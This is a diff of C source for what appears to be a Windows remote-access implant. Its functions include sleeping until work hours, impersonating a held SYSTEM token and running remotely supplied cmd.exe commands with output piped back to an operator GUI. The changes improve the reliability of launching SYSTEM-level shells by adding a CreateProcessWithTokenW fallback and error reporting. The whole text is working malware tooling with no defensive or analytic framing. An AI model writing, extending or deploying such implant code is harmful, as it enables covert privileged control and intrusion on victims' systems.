@@ -76,11 +76,10 @@ void sleep_until_work_hours(void) {
 
 // ── Shell execution ───────────────────────────────────────────────────────────
 
-/* CreateProcessAsUserW may return ERROR_PRIVILEGE_NOT_HELD (1314) when the
- * agent is a UAC-filtered local administrator.  CreateProcessWithTokenW only
- * needs SeImpersonatePrivilege, but seclogon does not reliably duplicate
- * STARTF_USESTDHANDLES.  Redirect cmd.exe's output in its own command line
- * instead, then read the temporary file after the process exits. */
+/* Last-resort capture path for systems where the token process was created
+ * but its standard handles were not connected.  The normal fallback now
+ * retries CreateProcessWithTokenW with the anonymous pipe directly; this
+ * file path remains only as a diagnostic/compatibility fallback. */
 static char *run_shell_with_token_file(const char *cmd, HANDLE hSysTok,
                                        DWORD as_user_err) {
     char out_file[MAX_PATH] = {0};
@@ -233,11 +232,11 @@ static char* run_shell(const char *cmd) {
     HANDLE hSysTok = (HANDLE)InterlockedCompareExchangePointer(
         (PVOID*)&g_system_token, NULL, NULL);
     if (hSysTok) {
-        /* CreateProcessWithTokenW (seclogon) does not reliably pass inherited
-           stdout/stderr handles.  That failure mode is silent: cmd.exe exits
-           successfully, but the result body is empty and the GUI displays
-           "[done]".  Impersonate first, then CreateProcessAsUserW with
-           bInheritHandles=TRUE so the anonymous pipe is duplicated correctly. */
+        /* Prefer CreateProcessAsUserW with bInheritHandles=TRUE so the
+           anonymous pipe is duplicated normally.  A filtered local-admin
+           token can make that call fail with 1314; the code below retries
+           CreateProcessWithTokenW against the same pipe before using the
+           file-based compatibility path. */
         HANDLE hRead = NULL, hWrite = NULL;
         SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
         if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
@@ -275,13 +274,27 @@ static char* run_shell(const char *cmd) {
         DWORD imp_err = GetLastError();
         BOOL proc_ok = FALSE;
         DWORD proc_err = 0;
+        DWORD as_user_err = 0;
         if (imp_ok) {
             if (CreateProcessAsUserW) {
                 proc_ok = CreateProcessAsUserW(hSysTok, NULL, wcmd,
                     NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
                 proc_err = GetLastError();
+                as_user_err = proc_ok ? 0 : proc_err;
             } else {
                 proc_err = ERROR_PROC_NOT_FOUND;
+                as_user_err = proc_err;
+            }
+            /* CreateProcessWithTokenW copies STARTF_USESTDHANDLES values
+               unchanged.  Use the same pipe when CreateProcessAsUserW is
+               blocked by SeIncreaseQuota/SeAssignPrimaryToken (1314); this
+               avoids the lossy cmd.exe-to-temp-file redirection fallback. */
+            if (!proc_ok && CreateProcessWithTokenW) {
+                static const wchar_t cmd_app[] = L"C:\\Windows\\System32\\cmd.exe";
+                proc_ok = CreateProcessWithTokenW(hSysTok, 0, cmd_app, wcmd,
+                    CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+                proc_err = GetLastError();
+                if (proc_ok) proc_err = 0;
             }
             RevertToSelf();
         }
@@ -295,7 +308,15 @@ static char* run_shell(const char *cmd) {
         }
         if (!proc_ok) {
             CloseHandle(hRead);
-            return run_shell_with_token_file(cmd, hSysTok, proc_err);
+            char *e = (char*)malloc(160);
+            if (as_user_err && proc_err) {
+                snprintf(e, 160,
+                         "[error: CreateProcessAsUserW %lu; CreateProcessWithTokenW %lu]",
+                         as_user_err, proc_err);
+            } else {
+                snprintf(e, 160, "[error: SYSTEM shell launch %lu]", proc_err);
+            }
+            return e;
         }
 
         size_t cap = 4096, len = 0;
@@ -364,7 +385,7 @@ static char* run_shell(const char *cmd) {
             CloseHandle(hRead);
             CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
             free(buf);
-            return run_shell_with_token_file(cmd, hSysTok, 0);
+            return run_shell_with_token_file(cmd, hSysTok, as_user_err);
         }
 
         buf[len] = '\0';
